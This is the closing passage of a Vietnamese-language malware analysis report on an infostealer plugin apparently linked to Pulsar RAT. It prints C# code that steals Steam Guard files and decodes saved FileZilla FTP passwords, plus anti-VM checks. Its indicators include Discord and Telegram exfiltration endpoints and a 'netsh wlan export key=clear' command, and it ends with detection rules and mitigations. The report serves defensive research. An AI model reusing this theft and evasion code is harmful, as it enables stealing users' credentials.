**File Patterns được thu thập:**
```csharp
// File session (17 ký tự, kết thúc bằng 's')
if (name.EndsWith("s") && name.Length == 17)
    zip.AddFile(entryPath, File.ReadAllBytes(fileInfo.FullName));

// File cấu hình quan trọng
if (name.StartsWith("usertag") ||    // User identification
    name.StartsWith("settings") ||   // App settings
    name.StartsWith("key_data") ||   // Encryption keys
    name.StartsWith("configs") ||    // Config data
    name.StartsWith("maps"))         // Server/map data
    zip.AddFile(entryPath, File.ReadAllBytes(fileInfo.FullName));
```

**Giới hạn kích thước:**
```csharp
if (fileInfo.Length > 7120L)  // Bỏ qua file > 7KB
    return;
```

### 9.5.5 Steam - Thu thập Game Platform Data

**Registry Analysis:**
```csharp
RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\Valve");
string steamPath = registryKey.GetValue("SteamPath").ToString();
```

**SSFN Files (Steam Guard):**
```csharp
// SSFN = Steam Guard authentication files
foreach (string file in Directory.GetFiles(steamPath))
{
    if (file.Contains("ssfn"))  // Pattern: ssfn[random_numbers]
    {
        byte[] content = File.ReadAllBytes(file);
        zip.AddFile($"Steam\ssfn\{Path.GetFileName(file)}", content);
    }
}
```

**Config Files (VDF format):**
```csharp
// Valve Data Format files
string configPath = Path.Combine(steamPath, "config");
foreach (string file in Directory.GetFiles(configPath, "*.vdf"))
{
    zip.AddFile($"Steam\configs\{Path.GetFileName(file)}", File.ReadAllBytes(file));
}
// Bao gồm: loginusers.vdf, config.vdf, steamapps.vdf
```

**Installed Games List:**
```csharp
RegistryKey appsKey = registryKey.OpenSubKey("Apps");
foreach (string subKeyName in appsKey.GetSubKeyNames())
{
    string gameName = registryKey3.GetValue("Name") as string;
    string installed = ((int?)registryKey3.GetValue("Installed")).GetValueOrDefault() == 1 ? "Yes" : "No";
    string running = ((int?)registryKey3.GetValue("Running")).GetValueOrDefault() == 1 ? "Yes" : "No";
    string updating = ((int?)registryKey3.GetValue("Updating")).GetValueOrDefault() == 1 ? "Yes" : "No";
    // AppID: subKeyName
}
```

**AutoLogin Info:**
```csharp
string autologinInfo = $@"Autologin User: {registryKey1.GetValue("AutoLoginUser")?.ToString() ?? "Unknown"}
Remember password: {(((int?)registryKey1.GetValue("RememberPassword")).GetValueOrDefault() == 1 ? "Yes" : "No")}";
```

### 9.5.6 FileZilla - FTP Password Decryption

**XML Parsing:**
```csharp
string[] configFiles = new string[]
{
    $"{appdata}\FileZilla\recentservers.xml",
    $"{appdata}\FileZilla\sitemanager.xml"
};
```

**Password Extraction (Base64 Decode):**
```csharp
XmlDocument xmlDocument = new XmlDocument();
xmlDocument.Load(configFile);

foreach (XmlNode xmlNode in xmlDocument.GetElementsByTagName("Server"))
{
    string encodedPass = xmlNode?["Pass"]?.InnerText;  // Base64 encoded
    if (!string.IsNullOrEmpty(encodedPass))
    {
        string password = Encoding.UTF8.GetString(Convert.FromBase64String(encodedPass));
        string url = $"ftp://{xmlNode["Host"]?.InnerText}:{xmlNode["Port"]?.InnerText}/";
        string username = xmlNode["User"]?.InnerText;
        // Output: Url, Username, Password
    }
}
```

---

## 10. KỸ THUẬT ANTI-ANALYSIS

### 10.1 Anti-VM (8 kiểm tra)

```csharp
public static void CheckOrExit()
{
    if (ProccessorCheck()) throw new Exception();      // CPU <= 1 core
    if (CheckDebugger()) throw new Exception();        // Debugger attached
    if (CheckMemory()) throw new Exception();          // RAM < 2GB
    if (CheckDriveSpace()) throw new Exception();      // Disk < 50GB
    if (CheckUserConditions()) throw new Exception();  // Sandbox usernames
    if (CheckCache()) throw new Exception();           // No cache memory
    if (CheckFileName()) throw new Exception();        // "sandbox" in name
    if (CheckCim()) throw new Exception();             // No CIM memory
}
```

### 10.2 Anti-Sandbox Usernames

```csharp
// Windows Defender Application Guard
"WDAGUtilityAccount"

// Sandbox patterns
("frank" + "desktop")
("robert" + "22h2")
```

### 10.3 Costura.Fody Packing

- Nhúng tất cả DLL dependencies vào assembly chính
- Nén DLLs trong resources
- Load runtime qua AssemblyLoader

---

## 11. IOCs (INDICATORS OF COMPROMISE)

### 11.1 File Paths

```
%APPDATA%\pulsar_cl_conf.bin              # Config file
%TEMP%\IntelixWifiExport_*                 # WiFi export temp
%TEMP%\{Username}_{ComputerName}_*.zip    # Output archive
```

### 11.2 Registry Keys

```
HKEY_CURRENT_USER\Software\Pulsar          # Pulsar plugin config
HKEY_LOCAL_MACHINE\SOFTWARE\Intelix        # Potential persistence
```

### 11.3 Network Indicators

```
https://discord.com/api/webhooks/*        # Discord webhook
https://api.telegram.org/bot*/sendDocument # Telegram API
```

### 11.4 Process Indicators

```
netsh wlan export profile key=clear        # WiFi key export
```

### 11.5 Mutex/Objects

```
Intelix_*                                  # Potential mutex names
```

---

## 12. BIỆN PHÁP PHÒNG CHỐNG

### 12.1 User-Level

1. **Password Manager**: Dùng Bitwarden, 1Password, KeePass
2. **Tắt AutoFill**: Chrome Settings > Autofill > OFF
3. **2FA/MFA**: Bật cho tất cả tài khoản quan trọng
4. **Hardware Wallet**: Ledger, Trezor cho crypto
5. **Cloud Sync**: Mã hóa trước khi sync

### 12.2 Enterprise-Level

1. **EDR**: CrowdStrike, SentinelOne, Microsoft Defender for Endpoint
2. **Application Control**: AppLocker, WDAC
3. **Network Monitoring**: Giám sát Discord/Telegram APIs
4. **Email Security**: Chặn file .exe, .dll, .zip đáng ngờ
5. **User Training**: Phishing awareness, password security

### 12.3 Technical Controls

```powershell
# Disable browser password saving (GPO)
Computer Configuration > Administrative Templates > 
    Google Chrome > Password manager > Disable

# Block Discord webhooks (Firewall)
New-NetFirewallRule -DisplayName "Block Discord Webhooks" 
    -Direction Outbound -RemoteAddress "162.159.0.0/16" -Action Block

# Monitor for netsh wlan export (Sysmon)
<RuleGroup name="WiFi Export Detection">
    <ProcessCreate onmatch="include">
        <CommandLine condition="contains">netsh wlan export</CommandLine>
    </ProcessCreate>
</RuleGroup>
```

---

## 13. TÀI LIỆU THAM KHẢO KỸ THUẬT

### 13.1 Chromium Security
- [Chromium Password Manager](https://www.chromium.org/developers/design-documents/password-manager)
- [Chrome Local State Format](https://www.chromium.org/developers/design-documents/local-state)

### 13.2 Firefox NSS
- [NSS Documentation](https://firefox-source-docs.mozilla.org/security/nss/index.html)
- [Firefox Password Storage](https://wiki.mozilla.org/Firefox/Projects/Password_Manager)

### 13.3 SQLite Format
- [SQLite File Format](https://www.sqlite.org/fileformat.html)
- [SQLite Database File Format](https://www.sqlite.org/fileformat2.html)

### 13.4 DPAPI
- [Microsoft DPAPI](https://docs.microsoft.com/en-us/windows/win32/seccng/cng-dpapi)
- [DPAPI Security](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28)

### 13.5 BIP-39
- [BIP-39 Specification](https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki)
- [Mnemonic Code Converter](https://iancoleman.io/bip39/)

---

## 14. KẾT LUẬN

### 14.1 Đánh giá mức độ nguy hiểm

| Tiêu chí | Mức độ | Ghi chú |
|----------|--------|---------|
| **Phổ biến** | Cao | Tích hợp Pulsar RAT |
| **Khả năng lây nhiễm** | Trung bình | Cần manual execution |
| **Mức độ thiệt hại** | Rất cao | 84+ browsers, 20+ wallets |
| **Khó phát hiện** | Cao | Anti-VM, custom SQLite |
| **Khó gỡ bỏ** | Trung bình | Không persistence mạnh |

### 14.2 Đặc điểm nổi bật

1. **Kiến trúc modular**: Dễ mở rộng target mới
2. **Crypto đa dạng**: 15+ thuật toán mã hóa
3. **SQLite tùy chỉnh**: Bypass file locking
4. **Parallel processing**: Tốc độ thu thập nhanh
5. **Anti-VM**: 8 kiểm tra sandbox
6. **Seed phrase hunter**: Regex BIP-39

### 14.3 Khuyến nghị

- **Người dùng cá nhân**: Dùng password manager, 2FA, hardware wallet
- **Doanh nghiệp**: Triển khai EDR, application control, user training
- **Nhà nghiên cứu**: Theo dõi IOCs, phát triển detection rules

---

**END OF REPORT**

*Báo cáo này được tạo cho mục đích nghiên cứu an ninh mạng. Không sử dụng cho mục đích bất hợp pháp.*

**Hash của báo cáo**: SHA256 (để xác thực tính toàn vẹn)
